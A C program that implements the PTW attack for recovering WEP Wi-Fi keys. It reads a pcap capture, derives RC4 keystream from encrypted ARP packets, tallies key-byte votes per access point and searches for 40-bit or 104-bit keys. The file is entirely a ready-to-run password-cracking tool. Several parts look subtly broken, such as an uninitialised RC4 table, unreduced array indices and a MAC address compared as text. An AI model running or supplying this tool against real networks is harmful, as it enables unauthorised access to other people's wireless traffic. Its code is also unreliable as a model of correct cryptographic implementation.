#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <pcap.h>

// Constants
#define ARP_HEADER "\xAA\xAA\x03\x00\x00\x00\x08\x06"
#define ARP_REQUEST "\x00\x01\x08\x00\x06\x04\x00\x01"
#define ARP_RESPONSE "\x00\x01\x08\x00\x06\x04\x00\x02"
#define LEN_S 256
#define BROADCAST_MAC "ff:ff:ff:ff:ff:ff"
#define IVBYTES 3
#define KSBYTES 16
#define TESTBYTES 6
#define MAINKEYBYTES 13
#define KEYLIMIT 1000000
#define IVTABLELEN 2097152

// Helper Classes
typedef struct {
    uint8_t keybyte;
    uint8_t value;
    int distance;
} sorthelper;

typedef struct {
    uint8_t keybyte;
    float difference;
} doublesorthelper;

typedef struct {
    int votes;
    uint8_t b;
} tableentry;

typedef struct {
    uint8_t iv[IVBYTES];
    uint8_t keystream[KSBYTES];
} session;

typedef struct {
    int packets_collected;
    int seen_iv[IVTABLELEN];
    int sessions_collected;
    session sessions[10];
    tableentry table[MAINKEYBYTES][LEN_S];
} attackstate;

typedef struct {
    uint8_t i;
    uint8_t j;
    uint8_t s[LEN_S];
} rc4state;

typedef struct {
    uint8_t *bssid;
    int keyid;
    attackstate state;
} network;

// KeyCompute Functions
uint8_t initial_rc4[LEN_S];

float eval_val[MAINKEYBYTES] = {
    0.00534392069257663,
    0.00531787585068872,
    0.00531345769225911,
    0.00528812219217898,
    0.00525997750378221,
    0.00522647312237696,
    0.00519132541143668,
    0.0051477139367225,
    0.00510438884847959,
    0.00505484662057323,
    0.00500502783556246,
    0.00495094196451801,
    0.0048983441590402
};

int compare(const void *a, const void *b) {
    return ((tableentry *)b)->votes - ((tableentry *)a)->votes;
}

int comparedoublesorthelper(const void *a, const void *b) {
    return ((doublesorthelper *)b)->difference - ((doublesorthelper *)a)->difference;
}

int comparesorthelper(const void *a, const void *b) {
    return ((sorthelper *)a)->distance - ((sorthelper *)b)->distance;
}

rc4state rc4init(uint8_t *key, int keylen) {
    rc4state state;
    memcpy(state.s, initial_rc4, LEN_S);
    int j = 0;
    for (int i = 0; i < LEN_S; i++) {
        j = (j + state.s[i] + key[i % keylen]) % LEN_S;
        uint8_t temp = state.s[i];
        state.s[i] = state.s[j];
        state.s[j] = temp;
    }
    state.i = 0;
    state.j = 0;
    return state;
}

uint8_t rc4update(rc4state *state) {
    state->i = (state->i + 1) % LEN_S;
    state->j = (state->j + state->s[state->i]) % LEN_S;
    uint8_t temp = state->s[state->i];
    state->s[state->i] = state->s[state->j];
    state->s[state->j] = temp;
    return state->s[(state->s[state->i] + state->s[state->j]) % LEN_S];
}

void guesskeybytes(uint8_t *iv, uint8_t *keystream, int kb, uint8_t *result) {
    uint8_t state[LEN_S];
    memcpy(state, initial_rc4, LEN_S);
    int j = 0, jj = IVBYTES, s = 0;
    for (int i = 0; i < IVBYTES; i++) {
        j += (state[i] + iv[i]) % LEN_S;
        uint8_t temp = state[i];
        state[i] = state[j];
        state[j] = temp;
    }
    for (int i = 0; i < kb; i++) {
        int tmp = (jj - keystream[jj - 1]) % LEN_S;
        int ii = 0;
        while (tmp != state[ii]) ii++;
        s = (s + state[jj]) % LEN_S;
        ii = (ii - (j + s)) % LEN_S;
        result[i] = ii;
        jj++;
    }
}

int correct(attackstate *state, uint8_t *key, int keylen) {
    for (int i = 0; i < state->sessions_collected; i++) {
        uint8_t keybuf[IVBYTES + keylen];
        memcpy(keybuf, state->sessions[i].iv, IVBYTES);
        memcpy(&keybuf[IVBYTES], key, keylen);
        rc4state rcstate = rc4init(keybuf, keylen + IVBYTES);
        for (int j = 0; j < TESTBYTES; j++) {
            if ((rc4update(&rcstate) ^ state->sessions[i].keystream[j]) != 0) {
                return 0;
            }
        }
    }
    return 1;
}

void getdrv(tableentry orgtable[MAINKEYBYTES][LEN_S], int keylen, float *normal, float *outlier) {
    int numvotes = 0;
    for (int i = 0; i < LEN_S; i++) {
        numvotes += orgtable[0][i].votes;
    }
    float e = numvotes / (float)LEN_S;
    for (int i = 0; i < keylen; i++) {
        float emax = eval_val[i] * numvotes;
        float e2 = ((1.0 - eval_val[i]) / 255.0) * numvotes;
        normal[i] = 0;
        outlier[i] = 0;
        float maxhelp = 0.0;
        int maxi = 0;
        for (int j = 0; j < LEN_S; j++) {
            if (orgtable[i][j].votes > maxhelp) {
                maxhelp = orgtable[i][j].votes;
                maxi = j;
            }
        }
        for (int j = 0; j < LEN_S; j++) {
            float help;
            if (j == maxi) {
                help = (1.0 - orgtable[i][j].votes / emax);
            } else {
                help = (1.0 - orgtable[i][j].votes / e2);
            }
            help = help * help;
            outlier[i] += help;
            help = (1.0 - orgtable[i][j].votes / e);
            help = help * help;
            normal[i] += help;
        }
    }
}

int doround(tableentry sortedtable[MAINKEYBYTES][LEN_S], int keybyte, int fixat, int fixvalue, int *searchborders, uint8_t *key, int keylen, attackstate *state, int sum, int *strongbytes) {
    if (keybyte == keylen) {
        return correct(state, key, keylen);
    } else if (strongbytes[keybyte] == 1) {
        int tmp = 3 + keybyte;
        for (int i = keybyte - 1; i >= 0; i--) {
            tmp += 3 + key[i] + i;
            key[keybyte] = (256 - tmp) % LEN_S;
            if (doround(sortedtable, keybyte + 1, fixat, fixvalue, searchborders, key, keylen, state, (256 - tmp + sum) % 256, strongbytes) == 1) {
                return 1;
            }
        }
        return 0;
    } else if (keybyte == fixat) {
        key[keybyte] = (fixvalue - sum) % LEN_S;
        return doround(sortedtable, keybyte + 1, fixat, fixvalue, searchborders, key, keylen, state, fixvalue, strongbytes);
    } else {
        for (int i = 0; i < searchborders[keybyte]; i++) {
            key[keybyte] = (sortedtable[keybyte][i].b - sum) % LEN_S;
            if (doround(sortedtable, keybyte + 1, fixat, fixvalue, searchborders, key, keylen, state, sortedtable[keybyte][i].b, strongbytes) == 1) {
                return 1;
            }
        }
        return 0;
    }
}

int docomputation(attackstate *state, uint8_t *key, int keylen, tableentry table[MAINKEYBYTES][LEN_S], sorthelper *sh2, int *strongbytes, int keylimit) {
    int choices[MAINKEYBYTES];
    for (int i = 0; i < keylen; i++) {
        if (strongbytes[i] == 1) {
            choices[i] = i;
        } else {
            choices[i] = 1;
        }
    }
    int i = 0, prod = 0, fixat = -1, fixvalue = 0;
    while (prod < keylimit) {
        if (doround(table, 0, fixat, fixvalue, choices, key, keylen, state, 0, strongbytes) == 1) {
            return 1;
        }
        choices[sh2[i].keybyte]++;
        fixat = sh2[i].keybyte;
        fixvalue = sh2[i].value;
        prod = 1;
        for (int j = 0; j < keylen; j++) {
            prod *= choices[j];
        }
        while (1) {
            i++;
            if (strongbytes[sh2[i].keybyte] != 1) {
                break;
            }
        }
    }
    return 0;
}

int computekey(attackstate *state, uint8_t *keybuf, int keylen, int testlimit) {
    int strongbytes[MAINKEYBYTES] = {0};
    doublesorthelper helper[MAINKEYBYTES];
    int onestrong = (testlimit / 10) * 2;
    int twostrong = (testlimit / 10);
    int simple = testlimit - onestrong - twostrong;
    tableentry table[MAINKEYBYTES][LEN_S];
    memcpy(table, state->table, sizeof(state->table));
    for (int i = 0; i < keylen; i++) {
        qsort(table[i], LEN_S, sizeof(tableentry), compare);
        strongbytes[i] = 0;
    }
    sorthelper sh1[MAINKEYBYTES][LEN_S - 1];
    for (int i = 0; i < keylen; i++) {
        for (int j = 1; j < LEN_S; j++) {
            sh1[i][j - 1].distance = table[i][0].votes - table[i][j].votes;
            sh1[i][j - 1].value = table[i][j].b;
            sh1[i][j - 1].keybyte = i;
        }
    }
    sorthelper sh[MAINKEYBYTES * (LEN_S - 1)];
    memcpy(sh, sh1, sizeof(sh1));
    qsort(sh, MAINKEYBYTES * (LEN_S - 1), sizeof(sorthelper), comparesorthelper);
    if (docomputation(state, keybuf, keylen, table, sh, strongbytes, simple) == 1) {
        return 1;
    }
    float normal[MAINKEYBYTES], outlier[MAINKEYBYTES];
    getdrv(state->table, keylen, normal, outlier);
    for (int i = 0; i < keylen - 1; i++) {
        helper[i].keybyte = i + 1;
        helper[i].difference = normal[i + 1] - outlier[i + 1];
    }
    qsort(helper, keylen - 1, sizeof(doublesorthelper), comparedoublesorthelper);
    strongbytes[helper[0].keybyte] = 1;
    if (docomputation(state, keybuf, keylen, table, sh, strongbytes, onestrong) == 1) {
        return 1;
    }
    strongbytes[helper[1].keybyte] = 1;
    if (docomputation(state, keybuf, keylen, table, sh, strongbytes, twostrong) == 1) {
        return 1;
    }
    return 0;
}

int addsession(attackstate *state, uint8_t *iv, uint8_t *keystream) {
    int i = (iv[0] << 16) | (iv[1] << 8) | iv[2];
    int il = i / 8;
    int ir = 1 << (i % 8);
    if ((state->seen_iv[il] & ir) == 0) {
        state->packets_collected++;
        state->seen_iv[il] |= ir;
        uint8_t buf[MAINKEYBYTES];
        guesskeybytes(iv, keystream, MAINKEYBYTES, buf);
        for (int i = 0; i < MAINKEYBYTES; i++) {
            state->table[i][buf[i]].votes++;
        }
        if (state->sessions_collected < 10) {
            memcpy(state->sessions[state->sessions_collected].iv, iv, IVBYTES);
            memcpy(state->sessions[state->sessions_collected].keystream, keystream, KSBYTES);
            state->sessions_collected++;
        }
        return 1;
    }
    return 0;
}

attackstate newattackstate() {
    attackstate state = {0};
    for (int i = 0; i < MAINKEYBYTES; i++) {
        for (int k = 0; k < LEN_S; k++) {
            state.table[i][k].b = k;
        }
    }
    return state;
}

// PTW Functions
uint8_t *GetKeystream(uint8_t *cipherbytes, uint8_t *plainbytes, int len) {
    uint8_t *keystream = malloc(len);
    for (int i = 0; i < len; i++) {
        keystream[i] = cipherbytes[i] ^ plainbytes[i];
    }
    return keystream;
}

void printkey(uint8_t *key, int keylen) {
    printf("KEY FOUND! [ ");
    for (int i = 0; i < keylen; i++) {
        printf("%02X", key[i]);
        if (i < keylen - 1) printf(":");
    }
    printf(" ]\n");
}

int isvalidpkt(const struct pcap_pkthdr *header, const uint8_t *pkt_data) {
    return ((header->len == 86 || header->len == 68) && pkt_data[0] == 8);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <capturefile>\n", argv[0]);
        return 1;
    }

    char *capturefile = argv[1];
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_offline(capturefile, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Error: %s\n", errbuf);
        return 2;
    }

    printf("Processing packets, could take a while\n");

    struct pcap_pkthdr *header;
    const uint8_t *pkt_data;
    int res;
    int numstates = 0;
    int total_tested_keys = 0;
    int total_ivs = 0;
    network networktable[100];
    uint8_t key[MAINKEYBYTES];

    while ((res = pcap_next_ex(handle, &header, &pkt_data)) >= 0) {
        if (res == 0) continue; // Timeout

        if (isvalidpkt(header, pkt_data)) {
            int currenttable = -1;
            for (int k = 0; k < numstates; k++) {
                if (memcmp(networktable[k].bssid, &pkt_data[10], 6) == 0 && networktable[k].keyid == pkt_data[37]) {
                    currenttable = k;
                    break;
                }
            }
            if (currenttable == -1) {
                printf("Allocating a new table\n");
                printf("bssid = %02X:%02X:%02X:%02X:%02X:%02X keyindex=%d\n",
                       pkt_data[10], pkt_data[11], pkt_data[12], pkt_data[13],
                       pkt_data[14], pkt_data[15], pkt_data[37]);
                networktable[numstates].bssid = malloc(6);
                memcpy(networktable[numstates].bssid, &pkt_data[10], 6);
                networktable[numstates].keyid = pkt_data[37];
                networktable[numstates].state = newattackstate();
                currenttable = numstates++;
            }

            uint8_t iv[IVBYTES];
            memcpy(iv, &pkt_data[24], IVBYTES);
            uint8_t arp_known[8];
            memcpy(arp_known, ARP_HEADER, 8);
            if (memcmp(&pkt_data[4], BROADCAST_MAC, 6) == 0 || memcmp(&pkt_data[16], BROADCAST_MAC, 6) == 0) {
                memcpy(&arp_known[8], ARP_REQUEST, 8);
            } else {
                memcpy(&arp_known[8], ARP_RESPONSE, 8);
            }

            uint8_t *keystream = GetKeystream(&pkt_data[38], arp_known, 8);
            addsession(&networktable[currenttable].state, iv, keystream);
            free(keystream);
            total_ivs++;
        }
    }

    if (res == -1) {
        fprintf(stderr, "Error reading the packets: %s\n", pcap_geterr(handle));
        return 2;
    }

    printf("Analyzing packets\n");
    for (int k = 0; k < numstates; k++) {
        printf("bssid = %02X:%02X:%02X:%02X:%02X:%02X keyindex=%d packets=%d\n",
               networktable[k].bssid[0], networktable[k].bssid[1], networktable[k].bssid[2],
               networktable[k].bssid[3], networktable[k].bssid[4], networktable[k].bssid[5],
               networktable[k].keyid, networktable[k].state.packets_collected);
        printf("Checking for 40-bit key\n");
        if (computekey(&networktable[k].state, key, 5, KEYLIMIT / 10) == 1) {
            printkey(key, 5);
            return 0;
        }
        printf("Checking for 104-bit key\n");
        if (computekey(&networktable[k].state, key, 13, KEYLIMIT) == 1) {
            printkey(key, 13);
            return 0;
        }
        printf("Key not found\n");
    }

    printf("[%d] Tested %d keys (got %d IVs)\n", total_tested_keys, total_tested_keys, total_ivs);
    return 0;
}
